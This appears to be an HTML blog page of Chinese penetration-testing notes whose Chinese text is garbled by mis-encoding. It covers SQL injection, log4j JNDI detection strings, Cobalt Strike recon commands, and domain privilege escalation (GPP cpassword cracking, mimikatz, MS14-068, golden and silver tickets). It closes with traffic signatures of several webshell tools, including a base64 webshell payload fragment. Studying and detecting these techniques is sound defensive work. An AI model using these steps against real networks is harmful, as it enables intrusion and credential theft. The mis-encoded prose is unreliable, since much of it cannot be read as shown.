<h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>â€‹    Sql æ³¨å…¥æ”»å‡»æ˜¯é€šè¿‡å°†æ¶æ„çš„ Sql æŸ¥è¯¢æˆ–æ·»åŠ è¯­å¥æ’å…¥åˆ°åº”ç”¨çš„è¾“å…¥å‚æ•°ä¸­ï¼Œå†åœ¨åå° Sql æœåŠ¡å™¨ä¸Šè§£ææ‰§è¡Œè¿›è¡Œçš„æ”»å‡»</p>
<ul>
<li>çŒœè§£åå°æ•°æ®åº“ï¼Œè¿™æ˜¯åˆ©ç”¨æœ€å¤šçš„æ–¹å¼ï¼Œç›—å–ç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯ã€‚</li>
<li>ç»•è¿‡è®¤è¯ï¼Œåˆ—å¦‚ç»•è¿‡éªŒè¯ç™»å½•ç½‘ç«™åå°ã€‚</li>
<li>æ³¨å…¥å¯ä»¥å€ŸåŠ©æ•°æ®åº“çš„å­˜å‚¨è¿‡ç¨‹è¿›è¡Œææƒç­‰æ“ä½œ</li>
</ul>
<p>é˜²å¾¡</p>
<p>1ã€æ£€æŸ¥å˜é‡æ•°æ®ç±»å‹å’Œæ ¼å¼</p>
<p>2ã€è¿‡æ»¤ç‰¹æ®Šç¬¦å·</p>
<p>3ã€ç»‘å®šå˜é‡ï¼Œä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ã€€</p>
<h5 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h5><p>å°±æ˜¯å°†ä¸€å †sqlè¯­å¥å åŠ åœ¨ä¸€èµ·æ‰§è¡Œï¼Œä½¿ç”¨åˆ†å·ç»“æŸä¸Šä¸€ä¸ªè¯­å¥å†å åŠ å…¶ä»–è¯­å¥ä¸€èµ·æ‰§è¡Œ</p>
<h5 id="æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°"><a href="#æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°" class="headerlink" title="æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°"></a>æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°</h5><p>updatexml():æ˜¯mysqlå¯¹xmlæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„xpathå‡½æ•°<br>extractvalue()ï¼šæ˜¯mysqlå¯¹xmlæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢çš„xpathå‡½æ•°<br>floor():mysqlä¸­ç”¨æ¥å–æ•´çš„å‡½æ•°<br>exp():æ­¤å‡½æ•°è¿”å›e(è‡ªç„¶å¯¹æ•°çš„åº•)æŒ‡æ•°Xçš„å¹‚å€¼</p>
<h5 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h5><p>äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚</p>
<h2 id="log4jåŸç†"><a href="#log4jåŸç†" class="headerlink" title="log4jåŸç†"></a>log4jåŸç†</h2><p>  é€šè¿‡JNDIæ³¨å…¥æ¼æ´ï¼Œé»‘å®¢å¯ä»¥æ¶æ„æ„é€ ç‰¹æ®Šæ•°æ®è¯·æ±‚åŒ…ï¼Œè§¦å‘æ­¤æ¼æ´ï¼Œä»è€ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç </p>
<p><strong>JNID</strong></p>
<p> å³ Java çš„åç§°ä¸ç›®å½•æœåŠ¡æ¥å£ï¼Œåº”ç”¨é€šè¿‡è¯¥æ¥å£ä¸å…·ä½“çš„ç›®å½•æœåŠ¡è¿›è¡Œäº¤äº’</p>
<h5 id="æ”»å‡»ç‰¹å¾"><a href="#æ”»å‡»ç‰¹å¾" class="headerlink" title="æ”»å‡»ç‰¹å¾"></a>æ”»å‡»ç‰¹å¾</h5><p>æ”»å‡»è€…åœ¨æ”»å‡»è¿‡ç¨‹ä¸­å¯èƒ½ä½¿ç”¨ DNSLog è¿›è¡Œæ¼æ´æ¢æµ‹ï¼Œå»ºè®®æŸ¥çœ‹æ˜¯å¦æœ‰ç›¸å…³DNSlogå‘Šè­¦ï¼ˆå¯¹åº”ç§‘æ¥TSAè§„åˆ™ï¼šâ€œä¿¡æ¯æ³„éœ²-é€šè¿‡å¤–éƒ¨å¹³å°å›æ˜¾æ•°æ®â€ï¼‰ï¼›</p>
<p> å›æº¯æµé‡æˆ–æ—¥å¿—ä¸­æ˜¯å¦å­˜åœ¨â€œjndi:ldap://â€ã€â€œjndi:rmiâ€ç­‰å­—ç¬¦ã€‚</p>
<h2 id="å†…ç½‘"><a href="#å†…ç½‘" class="headerlink" title="å†…ç½‘"></a>å†…ç½‘</h2><h4 id="åŸºæœ¬å‘½ä»¤"><a href="#åŸºæœ¬å‘½ä»¤" class="headerlink" title="åŸºæœ¬å‘½ä»¤"></a>åŸºæœ¬å‘½ä»¤</h4><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CSä¸­ï¼šshell+å‘½ä»¤å³å¯</span><br><span class="line">//ä¸»æœºä¿¡æ¯</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">//ç½‘ç»œä¿¡æ¯</span><br><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">//è·¯ç”±è¡¨</span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">//è¿›ç¨‹ï¼ŒæŸ¥AV</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">//ç«¯å£å ç”¨æƒ…å†µ</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">//æ˜¯å¦åŸŸç¯å¢ƒ</span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line">//æ˜¯å¦å‡ºç½‘</span><br><span class="line">ping baidu.com -n 2</span><br></pre></td></tr></table></figure>
</blockquote>
<p>åœ¨æ¨ªå‘è¿è¾“å‰æœ€å¥½å…ˆæŒ‚æŒ‚ä»£ç†ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ä½¿ç”¨msfçš„å…¶ä»–å·¥å…·</p>
<h4 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h4><p>â€‹        æ¨ªå‘ç§»åŠ¨æ˜¯æŒ‡å½“æ”»å‡»è€…åœ¨å†…éƒ¨ç½‘ç»œä¸­è·å¾—åˆå§‹è®¿é—®æƒé™ä»¥åï¼Œé€šè¿‡æ‰«æï¼Œå£ä»¤çˆ†ç ´ï¼Œsmbä¼ é€’ç­‰æŠ€æœ¯æ‰©å¤§æ•æ„Ÿæ•°æ®å’Œé«˜ä»·å€¼èµ„äº§æƒé™å¹¶é€šè¿‡å—æ”»å‡»ç½‘ç»œç¯å¢ƒä¸­ç§»åŠ¨çš„è¡Œä¸º</p>
<h4 id="åŸŸæ§"><a href="#åŸŸæ§" class="headerlink" title="åŸŸæ§"></a>åŸŸæ§</h4><p>â€‹        åŸŸæ§ç®€ç§°DCï¼Œæ˜¯åœ¨å†…ç½‘é‡Œå“åº”å®‰å…¨èº«ä»½è®¤è¯è¯·æ±‚çš„ç½‘ç»œæœåŠ¡å™¨ï¼Œå¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå­˜å‚¨ç”¨æˆ·è´¦æˆ·ä¿¡æ¯ï¼Œå¹¶æ‰§è¡Œçš„åŸŸçš„ä¸€ç§å®‰å…¨ç­–ç•¥</p>
<h4 id="åŸŸ"><a href="#åŸŸ" class="headerlink" title="åŸŸ"></a>åŸŸ</h4><p>â€œåŸŸâ€æ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºç»„åˆï¼ˆä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·æ— æ³•è®¿é—®å¦ä¸€ä¸ªåŸŸä¸­çš„èµ„æºï¼‰</p>
<h4 id="æ™®é€šç”¨æˆ·è·å–åŸŸç®¡ç†æƒé™"><a href="#æ™®é€šç”¨æˆ·è·å–åŸŸç®¡ç†æƒé™" class="headerlink" title="æ™®é€šç”¨æˆ·è·å–åŸŸç®¡ç†æƒé™"></a>æ™®é€šç”¨æˆ·è·å–åŸŸç®¡ç†æƒé™</h4><p><strong>åˆ©ç”¨GPPæ¼æ´è·å–åŸŸç®¡ç†æƒé™</strong></p>
<p>SYSVOLæ˜¯åŸŸå†…çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œç”¨æ¥å­˜æ”¾ç™»å½•è„šæœ¬ã€ç»„ç­–ç•¥è„šæœ¬ç­‰ä¿¡æ¯ã€‚å½“åŸŸç®¡ç†å‘˜é€šè¿‡ç»„ç­–ç•¥ä¿®æ”¹å¯†ç æ—¶ï¼Œåœ¨è„šæœ¬ä¸­å¼•å…¥ç”¨æˆ·å¯†ç ï¼Œå°±å¯èƒ½å¯¼è‡´å®‰å…¨é—®é¢˜</p>
<p>1ï¼‰è®¿é—®SYSVOLå…±äº«æ–‡ä»¶å¤¹ï¼Œæœç´¢åŒ…å«â€œcpasswordâ€çš„XMLæ–‡ä»¶ï¼Œè·å–AESåŠ å¯†çš„å¯†ç ã€‚</p>
<p>2ï¼‰ä½¿ç”¨kaliè‡ªå¸¦çš„gpp-decryptè¿›è¡Œç ´è§£ï¼Œä»è€Œè·å–åŸŸè´¦å·å¯†ç ï¼Œç›´æ¥ç™»å½•åŸŸç®¡ç†å‘˜è´¦å·è·å–è®¿é—®æƒé™ã€‚</p>
<p><strong>è·å–æœåŠ¡å™¨æ˜æ–‡ç™»å½•å¯†ç </strong></p>
<p>ä½¿ç”¨kiwiæ¨¡å—éœ€è¦systemæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä½¿ç”¨è¯¥æ¨¡å—ä¹‹å‰éœ€è¦å°†å½“å‰MSFä¸­çš„shellæå‡ä¸ºsystemã€‚æåˆ°systemæœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€æ˜¯å½“å‰çš„æƒé™æ˜¯administratorç”¨æˆ·ï¼ŒäºŒæ˜¯åˆ©ç”¨å…¶å®ƒæ‰‹æ®µå…ˆææƒåˆ°administratorç”¨æˆ·ã€‚ç„¶åadministratorç”¨æˆ·å¯ä»¥ç›´æ¥getsystemåˆ°systemæƒé™</p>
<p><strong>ä½¿ç”¨MS14-068æ¼æ´è¿›è¡Œææƒ</strong></p>
<p>MS14068æ˜¯ä¸€ä¸ªèƒ½å¤Ÿä½¿æ™®é€šç”¨æˆ·ææƒåˆ°åŸŸæ§æƒé™çš„æƒé™æå‡æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„è¯·æ±‚åŒ…æ¥è¾¾åˆ°æå‡æƒé™çš„ç›®çš„</p>
<p><strong>çªƒå–åŸŸç®¡ç†å‘˜ä»¤ç‰Œ</strong></p>
<p><strong>è¿›ç¨‹è¿ç§»</strong></p>
<h4 id="ç¥¨æ®"><a href="#ç¥¨æ®" class="headerlink" title="ç¥¨æ®"></a>ç¥¨æ®</h4><p>åŸŸè®¤è¯ä¸‰éƒ¨æ›²ï¼š</p>
<ol>
<li>Client ä¸Šçš„ç”¨æˆ·è¯·æ±‚KDCæœåŠ¡ï¼Œæœ€åASæœåŠ¡ç”Ÿäº§TGTï¼Œè¿”å›ç»™Client</li>
<li>Client ä½¿ç”¨TGTè¯·æ±‚KDCä¸Šçš„TGSå¾—åˆ°STï¼ˆTGS ticketï¼‰çœŸæ­£è®¿é—®çš„ç¥¨æ®</li>
<li>Clientä½¿ç”¨STï¼ˆTGS Ticketï¼‰è®¿é—®Server</li>
</ol>
<p>åè¯åŸºæœ¬æ¦‚å¿µï¼š</p>
<p>â€‹    KDC: Key Distribution Centerï¼Œå¯†é’¥åˆ†å‘ä¸­å¿ƒï¼Œè´Ÿè´£ç®¡ç†ç¥¨æ®ã€è®¤è¯ç¥¨æ®ã€åˆ†å‘ç¥¨æ®ï¼Œä½†æ˜¯KDCä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æœåŠ¡ï¼Œå®ƒç”±ASå’ŒTGSç»„æˆã€‚</p>
<p>â€‹    AD: Account Databaseï¼Œå­˜å‚¨æ‰€æœ‰clientçš„ç™½åå•ï¼Œåªæœ‰å­˜åœ¨äºç™½åå•çš„clientæ‰èƒ½é¡ºåˆ©ç”³è¯·åˆ°TGTã€‚</p>
<p>ï¼ˆç‰©ç†æ–¹é¢ KDCå’ŒAD éƒ½æ˜¯ä¸€ä¸ªæœºå­ï¼‰</p>
<p>â€‹    TGT: Ticket Granting Ticket = å…¥åœºåˆ¸ï¼Œé€šè¿‡å…¥åœºåˆ¸èƒ½å¤Ÿè·å¾—ç¥¨æ®ï¼Œæ˜¯ä¸€ç§ä¸´æ—¶å‡­è¯çš„å­˜åœ¨ã€‚</p>
<p>â€‹    ASï¼ˆAuthentication Serverï¼‰= è®¤è¯æœåŠ¡å™¨,ä¸ºclientç”ŸæˆTGTçš„æœåŠ¡</p>
<p>â€‹    TGSï¼ˆTicket Granting Serverï¼‰= ç¥¨æ®æˆæƒæœåŠ¡å™¨</p>
<p>â€‹    SSï¼ˆService Serverï¼‰= ç‰¹å®šæœåŠ¡æä¾›ç«¯</p>
<h5 id="ç™½é“¶ç¥¨æ®"><a href="#ç™½é“¶ç¥¨æ®" class="headerlink" title="ç™½é“¶ç¥¨æ®"></a>ç™½é“¶ç¥¨æ®</h5><p>å‰æï¼š</p>
<p>1.ä¸éœ€è¦ä¸KDCè¿›è¡Œäº¤äº’ï¼Œç›´æ¥å’Œserverè®¤è¯</p>
<p>2.éœ€è¦ç›®æ ‡æœåŠ¡çš„NTLM Hash</p>
<p>å¦‚æœæˆ‘ä»¬æ‹¥æœ‰Server Hashæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ªä¸ç»è¿‡KDCè®¤è¯çš„ä¸€ä¸ªTicketï¼Œç›´æ¥å»serverç«¯å»éªŒè¯ã€‚</p>
<p>æ³¨ï¼šæœåŠ¡å™¨æ˜¯ä¸çŸ¥é“Server Session Keyæ˜¯ä»€ä¹ˆçš„ï¼ŒæœåŠ¡å™¨çš„Server Session Keyæ˜¯è§£å¯†ticketè·å¾—çš„ï¼Œæ‰€ä»¥ä¸€åˆ‡å‡­æ®çš„æ ¸å¿ƒåœ¨Server Hashï¼Œæœ‰äº†å®ƒå°±å¼€ä¸šç›´æ¥ä¼ªé€ ç¥¨æ®è®¤è¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket=Server Hash(Server Session Key+Client info+End Time) </span><br></pre></td></tr></table></figure>

<p>ç”±äºç™½é“¶ç¥¨æ®éœ€è¦ç›®æ ‡æœåŠ¡å™¨çš„Hashï¼Œæ‰€ä»¥æ²¡åŠæ³•ç”Ÿæˆå¯¹åº”åŸŸå†… æ‰€æœ‰æœåŠ¡å™¨çš„ç¥¨æ®ã€‚å› æ­¤åªèƒ½é’ˆå¯¹æœåŠ¡å™¨ ä¸Šçš„æŸäº›æœåŠ¡å»ä¼ªé€ </p>
<h5 id="é»„é‡‘ç¥¨æ®"><a href="#é»„é‡‘ç¥¨æ®" class="headerlink" title="é»„é‡‘ç¥¨æ®"></a>é»„é‡‘ç¥¨æ®</h5><p>å‰æï¼š</p>
<p>1.éœ€è¦ä¸DCé€šä¿¡</p>
<p>2.éœ€è¦krbtgtç”¨æˆ·çš„hashï¼ˆä¹Ÿå°±æ˜¯è¯´è¦æ‹¿ä¸‹åŸŸæ§åˆ¶å™¨ï¼‰</p>
<p>åŸç†ï¼š</p>
<p>å°±æ˜¯ä¼ªé€ çš„TGTï¼Œå®ƒä¼šåœ¨ç¬¬äºŒæ­¥è®¤è¯è¢«å‘é€åˆ°KDCçš„TGSï¼Œå¦‚æœæˆ‘ä»¬æœ‰äº†krbtgtç”¨æˆ·çš„hashå°±å¯ä»¥ç›´æ¥ä¼ªé€ TGTï¼Œå…¶ä¸­çš„KDCéœ€è¦çš„session keyï¼Œæ˜¯KDCè§£å¯†TGTä¹‹åè·å–çš„ï¼Œæ‰€ä»¥session keyä¹Ÿæ˜¯å’ŒTGTä¸€èµ·ä¼ªé€ çš„ï¼Œé‚£ä¹ˆåç»­çš„è®¤è¯ï¼Œå°±å¯ä»¥éšæ„çš„åˆ¶é€ æƒ³è¦çš„ç¥¨æ®äº†ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43171033/article/details/115933240">èµ„æ–™</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/291655.html">èµ„æ–™</a></p>
<h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><p>æˆå› ï¼š</p>
<p>KDCï¼ˆå¯†é’¥åˆ†å‘ï¼‰å¯¹PACè¿›è¡ŒéªŒè¯æ—¶ï¼Œå¯¹äºPACå°¾éƒ¨çš„ç­¾åç®—æ³•ï¼Œè™½ç„¶åŸç†ä¸Šè§„å®šå¿…é¡»æ˜¯å¸¦æœ‰Keyçš„ç­¾åç®—æ³•æ‰å¯ä»¥ï¼Œä½†å¾®è½¯åœ¨å®ç°ä¸Šï¼Œå´å…è®¸ä»»æ„ç­¾åç®—æ³•ï¼Œåªè¦å®¢æˆ·ç«¯æŒ‡å®šä»»æ„ç­¾åç®—æ³•ï¼ŒKDCæœåŠ¡å™¨å°±ä¼šä½¿ç”¨æŒ‡å®šçš„ç®—æ³•è¿›è¡Œç­¾åéªŒè¯ã€‚å› æ­¤ä¼ªé€ çš„ä»»æ„å†…å®¹éƒ½å¯ä»¥æ˜¯åˆæ³•çš„ï¼Œç›´æ¥åŠ ä¸Šå†…å®¹çš„MD5å€¼ä½œä¸ºç­¾åå³å¯ï¼ˆç¬¬ä¸€ä¸ªåŸå› ï¼‰</p>
<p> PACæ²¡æœ‰è¢«æ”¾åœ¨TGTä¸­ï¼Œæ”¾åœ¨å…¶å®ƒåœ°æ–¹ã€‚KDCåœ¨ä»ç„¶èƒ½å¤Ÿæ­£ç¡®è§£æå‡ºæ²¡æœ‰æ”¾åœ¨TGTä¸­çš„PACä¿¡æ¯PACå¿…é¡»æ˜¯å¯†æ–‡ï¼Œç»è¿‡KeyåŠ å¯†çš„KDCä¼šä»Authenticatorä¸­å–å‡ºæ¥subkeyï¼ŒæŠŠPACä¿¡æ¯è§£å¯†å¹¶åˆ©ç”¨å®¢æˆ·ç«¯è®¾å®šçš„ç­¾åç®—æ³•éªŒè¯ç­¾åï¼ˆç¬¬äºŒä¸ªåŸå› ï¼‰</p>
<p>KDCéªŒè¯ç¼ºå°‘PACçš„TGTæˆåŠŸåï¼Œå†éªŒè¯ä¸åœ¨TGTä¸­ çš„PACçš„åˆæ³•æ€§ã€‚å¦‚æœ2ä¸ªå‡éªŒè¯æˆåŠŸï¼ŒKDCæŠŠPACä¸­çš„User SIDã€Group SIDå–å‡ºæ¥ï¼Œé‡æ–°ä½¿ç”¨è¿›è¡Œç­¾åï¼Œç­¾åç®—æ³•å’Œå¯†é’¥ä¸è®¾ç½®inclue-pacæ ‡å¿—ä½ä¸ºTRUEæ—¶ä¸€æ¨¡ä¸€æ ·ã€‚å°†å°†æ–°äº§ç”Ÿçš„PACåŠ å…¥åˆ°è§£å¯†åçš„TGTä¸­ï¼Œå†é‡æ–°åŠ å¯†åˆ¶ä½œå…¨æ–°çš„TGTå‘é€ç»™Clientï¼Œä¸æ˜¯TGSï¼ˆç¬¬ä¸‰ä¸ªåŸå› ï¼‰</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/feizianquan/p/11760564.html#autoid-5-0-0">èµ„æ–™</a></p>
<h2 id="webshellæµé‡åˆ†æ"><a href="#webshellæµé‡åˆ†æ" class="headerlink" title="webshellæµé‡åˆ†æ"></a>webshellæµé‡åˆ†æ</h2><h4 id="èœåˆ€"><a href="#èœåˆ€" class="headerlink" title="èœåˆ€"></a>èœåˆ€</h4><p>é™æ€ç‰¹å¾ï¼š ä¸€å¥è¯æœ¨é©¬</p>
<p>åŠ¨æ€ç‰¹å¾ï¼š</p>
<blockquote>
<p>è¯·æ±‚åŒ…ä¸­ï¼š</p>
<p>uaå¤´ä¸ºç™¾åº¦çˆ¬è™«</p>
<p>è¯·æ±‚ä½“ä¸­å­˜åœ¨eavlï¼Œbase64ç­‰ç‰¹å¾å­—ç¬¦</p>
<p>è¯·æ±‚ä½“ä¸­ä¼ é€’çš„payloadä¸ºbase64ç¼–ç ï¼Œå¹¶ä¸”å­˜åœ¨å›ºå®šçš„QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</p>
<p>è¯·æ±‚ä½“ä¸­æ‰§è¡Œç»“æœå“åº”ä¸ºæ˜æ–‡</p>
</blockquote>
<h4 id="èšå‰‘"><a href="#èšå‰‘" class="headerlink" title="èšå‰‘"></a>èšå‰‘</h4><p><strong>é»˜è®¤ç¼–ç è¿æ¥æ—¶</strong></p>
<p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨èœåˆ€çš„ä¸€å¥è¯webshell</p>
<p>æ¯ä¸ªè¯·æ±‚ä½“éƒ½å­˜åœ¨@ini_set(â€œdisplay_errorsâ€, â€œ0â€);@set_time_limit(0)å¼€å¤´ã€‚å¹¶ä¸”å­˜åœ¨base64ç­‰å­—ç¬¦</p>
<p>å“åº”åŒ…çš„ç»“æœè¿”å›æ ¼å¼ä¸º éšæœºæ•° ç»“æœ éšæœºæ•°</p>
<p><strong>ä½¿ç”¨base64ç¼–ç å™¨å’Œè§£ç å™¨æ—¶</strong></p>
<p>èšå‰‘ä¼šéšæœºç”Ÿæˆä¸€ä¸ªå‚æ•°ä¼ å…¥base64ç¼–ç åçš„ä»£ç ï¼Œå¯†ç å‚æ•°çš„å€¼æ˜¯é€šè¿‡POSTè·å–éšæœºå‚æ•°çš„å€¼ç„¶åè¿›è¡Œbase64è§£ç åä½¿ç”¨evalæ‰§è¡Œ</p>
<p>å“åº”åŒ…çš„ç»“æœè¿”å›æ ¼å¼ä¸º éšæœºæ•° ç¼–ç åçš„ç»“æœ éšæœºæ•°</p>
<h4 id="å†°è"><a href="#å†°è" class="headerlink" title="å†°è"></a>å†°è</h4><p>é‡‡ç”¨é‡‡ç”¨é¢„å…±äº«å¯†é’¥ï¼Œå¯†é’¥æ ¼å¼ä¸ºmd5(â€œadminâ€)[0:16], æ‰€ä»¥åœ¨å„ç§è¯­è¨€çš„webshellä¸­éƒ½ä¼šå­˜åœ¨16ä½æ•°çš„è¿æ¥å¯†ç ï¼Œé»˜è®¤å˜é‡ä¸ºkã€‚</p>
<p>åœ¨PHPä¸­ä¼šåˆ¤æ–­æ˜¯å¦å¼€å¯opensslé‡‡ç”¨ä¸åŒçš„åŠ å¯†ç®—æ³•ï¼Œåœ¨ä»£ç ä¸­åŒæ ·ä¼šå­˜åœ¨evalæˆ–assertç­‰å­—ç¬¦ç‰¹å¾</p>
<p>åœ¨jspä¸­åˆ™åˆ©ç”¨javaçš„åå°„ï¼Œæ‰€ä»¥ä¼šå­˜åœ¨ClassLoaderï¼ŒgetClass().getClassLoader()ç­‰å­—ç¬¦ç‰¹å¾</p>
<p>åœ¨apsä¸­ä¼šåœ¨forå¾ªç¯è¿›è¡Œä¸€æ®µå¼‚æˆ–å¤„ç†</p>
<h5 id="å†°è2-0-webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾"><a href="#å†°è2-0-webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾" class="headerlink" title="å†°è2.0 webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾"></a>å†°è2.0 webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾</h5><p>åœ¨äº†è§£å†°è3.0ä¹‹å‰ï¼Œå…ˆçœ‹çœ‹2.0æ˜¯æ€ä¹ˆäº¤äº’ç­‰</p>
<p>2.0ä¸­é‡‡ç”¨åå•†å¯†é’¥æœºåˆ¶ã€‚ç¬¬ä¸€é˜¶æ®µè¯·æ±‚ä¸­è¿”å›åŒ…çŠ¶æ€ç ä¸º200ï¼Œè¿”å›å†…å®¹å¿…å®šæ˜¯16ä½çš„å¯†é’¥</p>
<p>Accept: text/html, image/gif, image/jpeg, *; q=.2, <em>/</em>; q=.2</p>
<p>å»ºç«‹è¿æ¥å æ‰€æœ‰è¯·æ±‚ Cookieçš„æ ¼å¼éƒ½ä¸º: Cookie: PHPSESSID=; path=/ï¼›</p>
<h5 id="å†°è3-0-webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾"><a href="#å†°è3-0-webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾" class="headerlink" title="å†°è3.0 webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾"></a>å†°è3.0 webshellæœ¨é©¬åŠ¨æ€ç‰¹å¾</h5><p>åœ¨3.0ä¸­æ”¹äº†ï¼Œå»é™¤äº†åŠ¨æ€å¯†é’¥åå•†æœºåˆ¶ï¼Œé‡‡ç”¨é¢„å…±äº«å¯†é’¥ï¼Œå…¨ç¨‹æ— æ˜æ–‡äº¤äº’ï¼Œå¯†é’¥æ ¼å¼ä¸ºmd5(â€œadminâ€)[0:16],ä½†è¿˜æ˜¯ä¼šå­˜åœ¨ä¸€äº›ç‰¹å¾</p>
<p>åœ¨ä½¿ç”¨å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½æ—¶ï¼Œè¯·æ±‚åŒ…ä¸­content-length ä¸º5740æˆ–5720ï¼ˆå¯èƒ½ä¼šæ ¹æ®Javaç‰ˆæœ¬è€Œæ”¹å˜ï¼‰</p>
<p>æ¯ä¸€ä¸ªè¯·æ±‚å¤´ä¸­å­˜åœ¨Pragma: no-cacheï¼ŒCache-Control: no-cache</p>
<p>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9</p>
<h4 id="å“¥æ–¯æ‹‰"><a href="#å“¥æ–¯æ‹‰" class="headerlink" title="å“¥æ–¯æ‹‰"></a>å“¥æ–¯æ‹‰</h4><p>å“¥æ–¯æ‹‰webshellé™æ€ç‰¹å¾</p>
<p>é€‰æ‹©é»˜è®¤è„šæœ¬ç¼–ç ç”Ÿæˆçš„æƒ…å†µä¸‹ï¼Œjspä¼šå‡ºç°xc,passå­—ç¬¦å’ŒJavaåå°„ï¼ˆClassLoaderï¼ŒgetClass().getClassLoader()ï¼‰ï¼Œbase64åŠ è§£ç ç­‰ç‰¹å¾</p>
<p>phpï¼Œaspåˆ™ä¸ºæ™®é€šçš„ä¸€å¥è¯æœ¨é©¬</p>
<h5 id="å“¥æ–¯æ‹‰webshellåŠ¨æ€ç‰¹å¾"><a href="#å“¥æ–¯æ‹‰webshellåŠ¨æ€ç‰¹å¾" class="headerlink" title="å“¥æ–¯æ‹‰webshellåŠ¨æ€ç‰¹å¾"></a>å“¥æ–¯æ‹‰webshellåŠ¨æ€ç‰¹å¾</h5><p>æ‰€æœ‰è¯·æ±‚ä¸­Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8</p>
<p>æ‰€æœ‰å“åº”ä¸­Cache-Control: no-store, no-cache, must-revalidate,</p>
<p>ä»¥ä¸Šä¸¤ä¸ªåªèƒ½ä½œä¸ºå¼±ç‰¹å¾å‚è€ƒ</p>
<p>åŒæ—¶åœ¨æ‰€æœ‰è¯·æ±‚ä¸­Cookieä¸­åé¢éƒ½å­˜åœ¨ï¼›ç‰¹å¾</p>
